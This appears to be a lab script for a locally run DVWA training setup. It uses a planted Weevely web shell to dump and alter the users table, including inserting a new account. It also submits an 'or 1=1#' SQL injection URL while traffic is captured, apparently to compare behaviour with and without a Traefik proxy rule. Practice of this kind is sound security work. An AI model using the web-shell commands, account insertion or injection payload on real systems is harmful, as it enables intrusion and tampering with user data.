#!/bin/bash

sqli_url="http://localhost/vulnerabilities/sqli/?id=1%27+or+1%3D1%23&Submit=Submit"

surname=granat
password=$(printf "%s" $surname | md5)

execute_sql_query_weevely()
{
    local backdoor_url=http://localhost/hackable/uploads/bd.php
    local backdoor_pass=123
    docker exec -it kali weevely "$backdoor_url" "$backdoor_pass" \
        ":sql_console -user app -passwd vulnerables -database dvwa 
            -query '$1;'"
}

# Start DVWA containers in detached mode
docker compose up -d

read -r -p "Create database on http://localhost/setup.php, then press Enter"

# Retrieve a list of all users from the DVWA database
execute_sql_query_weevely "select * from users"

# Insert a new user to the DVWA database with password 'user'
execute_sql_query_weevely \
    "insert into users values(6, \"$surname\", \"$surname\", \"$surname\", 
        \"$password\", \"/hackable/users/admin.jpg\", NOW(), 0)"

# Verify that the new user has been successfully inserted
execute_sql_query_weevely "select * from users"

# shellcheck disable=SC2162
read -p "Login on http://localhost/login.php, then open Wireshark, \
start capturing traffic on the lo interface and press Enter"

# Submit a SQL injection through the web interface
firefox "$sqli_url"

# shellcheck disable=SC2162
read -p "Uncomment the last line of traefik/dynamic_conf.yml, open \
Wireshark, start capturing traffic on the loopback interface and press Enter"

# Submit a SQL injection through the web interface again
firefox "$sqli_url"

# Stop and remove the DVWA containers from Docker
docker compose down
